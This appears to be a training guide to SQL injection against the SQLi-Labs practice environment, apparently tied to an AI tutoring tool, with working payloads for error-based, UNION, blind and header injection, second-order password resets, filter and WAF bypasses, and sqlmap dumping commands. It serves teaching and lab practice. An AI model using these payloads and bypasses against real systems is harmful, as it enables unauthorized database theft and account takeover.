# The Definitive Guide to SQL Injection

This guide synthesizes the empirical data gathered by the automated `sqli_final.py` scanner and the pedagogical framework of the `sqli_tutor` agent. It provides a deep dive into the mechanics of SQL injection, offering specific detection methodologies, closure analysis, and exploitation techniques using the SQLi-Labs environment as a primary reference point.

---

## 0. Foundational SQL Knowledge for Injection

Before attempting to exploit a vulnerability, you must understand the structure and syntax of the database you are interacting with. For SQLi-Labs, the target is **MySQL**.

### 0.1 The MySQL Hierarchy
MySQL follows a hierarchical structure that we navigate during an injection:
1.  **DBMS (Database Management System):** The software (MySQL 5.x/8.x).
2.  **Databases (Schemas):** Containers for related data (e.g., `security`, `information_schema`).
3.  **Tables:** Objects within a database (e.g., `users`, `emails`).
4.  **Columns:** Fields within a table (e.g., `username`, `password`).
5.  **Data:** The actual rows of information.

### 0.2 The `information_schema` (The "Map")
MySQL includes a virtual database called `information_schema` that contains metadata about all other databases on the server. This is the primary target for initial data extraction.
*   **`information_schema.schemata`**: Contains all database names.
    *   *Column:* `schema_name`
*   **`information_schema.tables`**: Contains all table names and their parent databases.
    *   *Columns:* `table_name`, `table_schema`
*   **`information_schema.columns`**: Contains all column names and their parent tables.
    *   *Columns:* `column_name`, `table_name`, `table_schema`

### 0.3 Essential Functions for Leakage
These functions are used to "fingerprint" the environment and extract data:
*   **`database()`**: Returns the name of the current database (e.g., `security`).
*   **`user()`**: Returns the current database user (e.g., `root@localhost`).
*   **`version()@@version`**: Returns the MySQL version.
*   **`group_concat()`**: Crucial for UNION attacks; it combines multiple rows of data into a single string so they can be reflected in one go.

### 0.4 String Manipulation & Logic
Used primarily in Blind injections to ask "Yes/No" questions:
*   **`ascii(char)`**: Returns the numerical ASCII code of a character.
*   **`substring(string, start, length)`**: Extracts a portion of a string.
*   **`length(string)`**: Returns the number of characters in a string.
*   **`IF(condition, true_val, false_val)`**: Conditional logic (used in Time-Based Blind).

---

## 1. Core Mechanics: The "Breakout"

At its core, SQL injection (SQLi) is a vulnerability of **context confusion**. An application takes untrusted user data and concatenates it directly into a database query string. The vulnerability occurs when the database parser cannot distinguish between the developer's intended SQL commands and the data provided by the user.

To exploit this, an attacker must perform a "Breakout"—crafting input that forces the parser to terminate the intended data context and begin executing the subsequent input as raw SQL commands.

### 1.1 Context Closure Analysis
Before any data extraction can occur, you must identify the exact characters the developer used to enclose the variable. The `sqli_final.py` scanner actively brute-forces these.

*   **Integer Context:** `SELECT * FROM users WHERE id=$id`
    *   **Breakout:** None needed. `id=1 UNION SELECT...`
*   **Single Quote Context:** `SELECT * FROM users WHERE id='$id'`
    *   **Breakout:** `id=1' UNION SELECT...` (Seen in Less-1)
*   **Double Quote Context:** `SELECT * FROM users WHERE id="$id"`
    *   **Breakout:** `id=1" UNION SELECT...` (Seen in Less-4)
*   **Parenthetical Contexts:** Often used with `IN()` clauses or complex logic. `SELECT * FROM users WHERE id=($id)` or `id=(('$id'))`.
    *   **Breakout:** `id=1')` or `id=1'))` (Seen in Less-3 and Less-7)

### 1.2 Syntax Balancing and Commenting
Once you break out, you must ensure the rest of the original query doesn't cause a syntax error that halts execution. You do this by commenting out the trailing characters.

*   `--+` (URL encoded `-- `): The standard SQL comment. The `+` becomes a space, which is required after the dashes in MySQL.
*   `#` (URL encoded `%23`): An alternative MySQL comment, often used in POST requests.
*   **Logical Balancing:** If comments are blocked (Less-23), use logical operators to balance the remaining quotes: `id=1' AND '1'='1`

---

## 2. Exploitation Typologies

SQL injection is broadly categorized by how the database responds to the injected query.

### Type A: Error-Based Extraction
The application is configured to display raw database error messages to the user. This is the most efficient side-channel for extraction because we can force the database to evaluate our subquery and print the result inside the error.

**The Mechanism:**
We use functions that expect specific XML formats, like `updatexml()` or `extractvalue()`. If we provide an invalid XPath expression, MySQL throws an error. If we dynamically construct that invalid path using a subquery, the subquery's result is leaked.

**Execution (Less-11 POST Injection):**
*   **Target:** `http://172.17.59.5/Less-11/`
*   **Vulnerability:** The `uname` parameter in the login form.
*   **Payload:** `admin' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#`
*   **Result:** The page returns: `XPATH syntax error: '~security~'`
*   **Insight:** The `0x7e` (tilde) is crucial. It acts as a definitive marker for our regex engines (like the one in `sqli_final.py`) to easily parse the extracted data from the surrounding HTML noise.

### Type B: UNION-Based Reflection
The application reflects the intended data on the page (e.g., displaying a user's profile). We use the `UNION` operator to append our own query's results to the original query.

**The Mechanism:**
For `UNION` to work, two strict conditions must be met:
1.  Both queries must return the exact same number of columns.
2.  The data types of the corresponding columns must be compatible.

**Execution (Less-1 GET Injection):**
1.  **Column Discovery:** Use `ORDER BY` to incremently guess the column count until the page breaks.
    *   `id=1' ORDER BY 3--+` (Normal page)
    *   `id=1' ORDER BY 4--+` (Error: Unknown column '4') -> The query has 3 columns.
2.  **Reflection Mapping:** Find which of those 3 columns are actually printed to the screen by injecting sentinel values.
    *   `id=-1' UNION SELECT 1,0x67656d696e6932,3--+` (Using Hex `gemini2` to bypass quote filters).
3.  **Extraction:** Replace the reflected column with the target data.
    *   `id=-1' UNION SELECT 1,group_concat(username,0x7e,password),3 FROM users--+`
    *   *Note on `id=-1`: We use a negative or non-existent ID so the first query returns an empty set, ensuring only our UNION data is displayed.*

### Type C: Boolean-Based Blind
The application does not display data or errors. However, the page content or HTTP status code changes based on whether the injected SQL logic evaluates to `TRUE` or `FALSE`.

**The Mechanism:**
We perform a binary search, asking the database character by character to confirm data.

**Execution (Less-5 GET Injection):**
*   **True Condition:** `id=1' AND 1=1--+` -> Page displays "You are in..."
*   **False Condition:** `id=1' AND 1=2--+` -> Page is blank.
*   **Extraction Logic:** Ask if the first letter of the database name has an ASCII value greater than 100.
    *   `id=1' AND ascii(substring(database(),1,1)) > 100--+`
    *   If the page says "You are in...", the statement is true. You narrow the search range until you pinpoint the exact character.

### Type D: Time-Based Blind
The ultimate "black box." The application's response is completely static regardless of true/false logic. We force the database to signal us by pausing its execution.

**The Mechanism:**
We use conditional logic tied to the `SLEEP()` function.

**Execution (Less-9 GET Injection):**
*   **Payload:** `id=1' AND IF(ascii(substring(database(),1,1))=115, SLEEP(5), 0)--+`
*   **Result:** If the first letter is 's' (ASCII 115), the HTTP response will be delayed by 5 seconds. If not, it returns instantly.
*   **Tooling Note:** This requires precise timing analysis, making tools like `curl` (via the extension's `test-payload` skill) or automated scanners like `sqlmap` essential.

---

## 3. Advanced Vectors and Complex Contexts

Injection is not limited to standard `WHERE` clauses in `SELECT` statements.

### 3.1 Header Injections (Less-18 to 22)
Applications frequently log client metadata into the database without sanitization.

*   **Vector:** HTTP Headers like `User-Agent`, `Referer`, or `X-Forwarded-For`.
*   **Context (Less-18):** The application runs an `INSERT` statement:
    `INSERT INTO security.uagents (uagent, ip_address, username) VALUES ('$uagent', '$ip', '$uname')`
*   **Breakout & Balancing:** We must break out of the string, inject our payload, and provide dummy data to satisfy the remaining expected columns.
    *   **Payload in User-Agent Header:** `' , '1' , updatexml(1,concat(0x7e,database(),0x7e),1)) #`
    *   **Resulting Query:** `VALUES ('' , '1' , updatexml(...)) #', '$ip', '$uname')`

### 3.2 Second-Order Injection (Less-24)
The injection occurs in two distinct phases. The malicious payload is safely stored in the database during phase one, but is executed unsafely in a different query during phase two.

*   **Phase 1 (Storage):** Create a user named `admin'#`. The application safely stores this literal string.
*   **Phase 2 (Execution):** The user `admin'#` logs in and attempts to change their password.
*   **The Vulnerable Query:** `UPDATE users SET password='NEW_PASS' WHERE username='admin'#'`
*   **Result:** The `#` comments out the closing quote, making the query target the *actual* admin account, successfully resetting their password.

---

## 4. Evasion and Filter Bypass

Modern applications utilize Web Application Firewalls (WAFs) or custom regex filters (like `preg_replace` in PHP) to block common SQLi syntax.

### 4.1 Keyword Filtering (Less-25 & Less-27)
If the application strips `UNION` and `SELECT`:
*   **Case Sensitivity:** If the filter is poorly written, simply change case: `uNioN SeLecT`
*   **Double-Writing:** If the filter performs a single-pass removal of the word "UNION", inject `unUNIONion`. The filter removes the inner word, causing the outer letters to collapse into a new, executable `UNION` command.

### 4.2 Whitespace Filtering (Less-26)
If the application strips spaces (e.g., `%20`):
*   **Alternative Whitespace:** MySQL interprets other characters as valid whitespace delimiters.
    *   URL-encoded Newlines: `%0a`
    *   URL-encoded Tabs: `%09`
    *   Vertical Tabs: `%0b`
*   **Inline Comments:** `/*!UNION*/` is an inline comment in standard SQL, but MySQL executes code contained within it. It serves simultaneously as a keyword obfuscator and a whitespace replacement.
    *   **Example:** `id=1'/*!AND*/1=2/*!UNION*//*!SELECT*/1,2,3--+`

### 4.3 HTTP Parameter Pollution (HPP) (Less-29)
When passing traffic through a WAF to a backend server, they may parse duplicated parameters differently.
*   **Request:** `?id=1&id=-1' UNION SELECT...`
*   **Mechanism:** The WAF might only inspect the first `id=1` (deeming it safe), while the backend PHP/MySQL server processes the second, malicious `id` parameter.

---

### 5. Automation Integration

While manual analysis is crucial for understanding the root cause, professional auditing relies on automation. Our `sqli-tutor` extension bridges this gap.

#### Automated Discovery (`sqlmap`)
The `run-sqlmap` skill within the agent automates the tedious processes described above.
*   **Command:** `sqlmap -u "http://172.17.59.5/Less-1/?id=1" --batch --dbs`
*   **Workflow:** `sqlmap` automatically identifies the injection type (Boolean, Time, Error, UNION), determines the necessary closure and tamper scripts, and iterates through `information_schema` to map the database architecture.

#### Sandboxed Verification (`curl` / Playwright)
When the AI Tutor proposes a payload, it relies on the `test-payload` or `browser-control` skills to verify the result *before* providing feedback, ensuring guidance is based on real HTTP responses (status codes, content length anomalies) rather than theoretical assumptions.

---

## 6. Tool-Specific Guides for Blind and Header Injections

Manual exploitation of Blind and Header-based vulnerabilities is often inefficient and error-prone. External tools are essential for reliable verification and data extraction.

### 6.1 `sqlmap` for Blind Injections (Boolean & Time)
When the application doesn't return errors or data, `sqlmap` uses high-speed timing and content-comparison algorithms to extract data.

**Step-by-Step Guide:**
1.  **Detection:** Run `sqlmap` with a higher "level" to ensure it tests all possible vectors.
    *   `sqlmap -u "http://172.17.59.5/Less-5/?id=1" --batch --technique=B --level=3 --risk=2`
    *   *Note: `--technique=B` limits it to Boolean Blind; use `T` for Time-Based.*
2.  **Database Fingerprinting:** Once a vulnerability is confirmed, identify the current database.
    *   `sqlmap -u "http://..." --batch --current-db`
3.  **Table Enumeration:**
    *   `sqlmap -u "http://..." --batch -D security --tables`
4.  **Data Extraction:**
    *   `sqlmap -u "http://..." --batch -D security -T users --columns`
    *   `sqlmap -u "http://..." --batch -D security -T users -C "username,password" --dump`

## 6. Burp Suite Mastery Guide

Burp Suite is the industry-standard "Intercepting Proxy." It sits between your browser and the web server, allowing you to pause, inspect, and modify requests before they are sent.

### 6.1 Setup & Interception (The Proxy)
1.  **Configure Proxy:** In Burp, go to **Proxy > Proxy settings**. Ensure the listener is on `127.0.0.1:8080`.
2.  **Browser Integration:** Configure your browser (or use Burp's built-in browser) to use the proxy.
3.  **Intercepting:** Go to **Proxy > Intercept**. Toggle **Intercept is ON**. Perform an action in the lab (e.g., submit a form).
4.  **Action:** Once the request is caught, right-click and select **Send to Repeater** (Ctrl+R).

### 6.2 The Repeater (Rapid Payload Testing)
This is where 90% of manual SQLi testing happens. It allows you to modify a request and resend it repeatedly without re-triggering it in the browser.
*   **Workflow:** Modify a parameter (e.g., `id=1'`) and click **Send**.
*   **Analysis:** Compare the "Response" pane to the baseline. Use the **Search** bar at the bottom to look for "error" or "login" to detect changes.
*   **Header Injection:** Directly edit `User-Agent` or `Cookie` headers here.

### 6.3 The Intruder (Fuzzing & Automation)
Use this for brute-forcing closures or finding filter bypasses.
1.  **Positions:** Highlight the injection point and click **Add §**.
2.  **Payloads:** Load a list of characters (`' , " , ) , ')) , #`) to find the correct closure.
3.  **Attack:** Run the attack and sort by **Length** or **Status Code** to find the outlier that indicates a successful breakout.

### 6.4 The Decoder & Comparer
*   **Decoder:** Use this to URL-encode payloads (Ctrl+U) or Base64-encode cookies (needed for Less-21 and 22).
*   **Comparer:** Send a "True" response and a "False" response to the Comparer. It highlights exactly which words or bytes changed, which is essential for identifying **Boolean-Blind** vulnerabilities.

---

## 7. The Browser & HackBar Workflow

For many injections, especially GET-based ones, you can work entirely within the browser using manual manipulation or an extension like **HackBar**.

### 7.1 Manual URL Manipulation
1.  **Direct Editing:** Append payloads directly to the URL: `http://target/Less-1/?id=1' UNION SELECT 1,2,3--+`.
2.  **Encoding Awareness:** Browsers automatically URL-encode some characters, but others (like `#`) may be interpreted as fragments. Use `%23` for `#` and `%26` for `&` to ensure they reach the server.

### 7.2 Using HackBar for Rapid Injection
HackBar provides a dedicated text area for crafting long payloads without the browser's URL bar getting in the way.
1.  **Load URL:** Click "Load URL" to bring the current parameters into the HackBar.
2.  **SQL Menu:** Many HackBars have a "SQL" menu that can auto-generate `UNION SELECT` or `group_concat()` templates.
3.  **Execution:** Click "Execute" to refresh the page with your modified payload.

### 7.3 Browser DevTools (The "Zero-Tool" Approach)
If you have no extensions, use the **Network Tab** (F12).
1.  **Inspect Request:** Perform an action and find the request in the list.
2.  **Edit and Resend:** Right-click the request and select **Edit and Resend** (in Firefox) or use the **Console** to send a `fetch()` request with a custom payload.
3.  **Cookie Manipulation:** Use the **Application/Storage** tab to manually edit cookies for Lessons 20-22.

### 7.4 Handling Encodings (Hex & Base64)
*   **Hex Bypass:** To bypass quote filters (Less-1), convert strings to Hex: `gemini` -> `0x67656d696e69`.
*   **Base64 Injection (Less-21/22):** 
    1.  Craft your payload: `admin') AND updatexml(...)#`.
    2.  Use an online tool or the **Burp Decoder** to Base64 encode it.
    3.  Paste the encoded string into the `uname` cookie.